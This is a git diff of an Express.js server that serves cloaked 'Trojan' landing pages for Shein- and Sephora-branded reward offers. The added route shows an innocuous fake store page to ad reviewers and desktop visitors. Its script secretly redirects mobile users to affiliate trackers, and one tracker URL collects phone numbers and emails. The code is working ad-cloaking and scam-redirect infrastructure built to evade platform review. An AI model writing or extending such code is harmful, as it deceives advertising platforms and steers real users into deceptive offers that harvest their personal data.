@@ -74,7 +74,7 @@ app.get('/jgw/:slug', (req, res, next) => {
             console.log(`Served twshein Trojan (tyler)(${slug})`);
 });
 
-// Middleware to pass on Tyler's SubIDs IMAGE LANDER
+// Middleware to pass on Tyler's SubIDs SHEIN IMAGE LANDER
 app.get('/twsheinimg/:slug', (req, res, next) => {
     const { offer, slug } = req.params;
     const destinationLander = `https://tok-reward.com/twsheinimg.html?sub=${slug}`;
@@ -107,7 +107,7 @@ app.get('/twsheinimg/:slug', (req, res, next) => {
             console.log(`Served twsheinimg Trojan (tyler)(${slug})`);
 });
 
-// Middleware to pass on Tyler's SubIDs DIRECT
+// Middleware to pass on Tyler's SubIDs DIRECT TO MRR 
 app.get('/twsheindir/:slug', (req, res, next) => {
     const { offer, slug } = req.params;
     const destinationLander = `https://sctrk.visit-24.com/4e06a3f4-32c3-5494-8c49-e059ad90b17e/?transaction_id=#clickid#&offer_id=#oid#&aff_id=#affid#&aff_sub=#traffic_source#&msisdn={mobile}&email={email}`;
@@ -173,7 +173,7 @@ app.get('/twsephora/:slug', (req, res, next) => {
             console.log(`Served twsheindir Trojan (tyler)(${slug})`);
 });
 
-// Middleware to pass on Tyler's SubIDs SEPHORA
+// Middleware to pass on Tyler's SubIDs SEPHORA IMAGE
 app.get('/twsephoraimg/:slug', (req, res, next) => {
     const { slug } = req.params;
     const destinationLander = `https://tok-reward.com/twsephorauk.html?sub=${slug}`;
@@ -306,7 +306,7 @@ app.get('/sheinca/:slug', (req, res, next) => {
 });
 
 // Middleware to pass on my slug values to MaxConv (SHEIN AU CAMP)
-app.get('/sheinau/:slug', (req, res, next) => {
+app.get('/sheinuk/:slug', (req, res, next) => {
     const { slug } = req.params;
     const destinationLander = `https://klcxb6.mcgo2.com/visit/8584e0ec-eef7-4bd2-b0c3-f61d8cf8cf73?slug=${slug}`;
     const trojanHTML = `
@@ -338,6 +338,38 @@ app.get('/sheinau/:slug', (req, res, next) => {
             console.log(`Served shein Trojan (maxconvtest)(${slug})`);
 });
 
+// Middleware to pass on my slug values to MaxConv (SHEIN AU CAMP)
+app.get('/sheinau/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://klcxb6.mcgo2.com/visit/a967a674-626e-404d-8b17-96c3a7dcdcd2?slug=${slug}`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+        </head>
+        <body>
+            <h1>Welcome to the new ${slug} Store!</h1>
+            <p>We hope you enjoy ${slug}'s best products.</p>
+        </body>
+        </html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served shein Trojan (maxconvtest)(${slug})`);
+});
 
 // Middleware to pass on my slug values to MaxConv (SEPHORA CAMP)
 app.get('/sephora/:slug', (req, res, next) => {
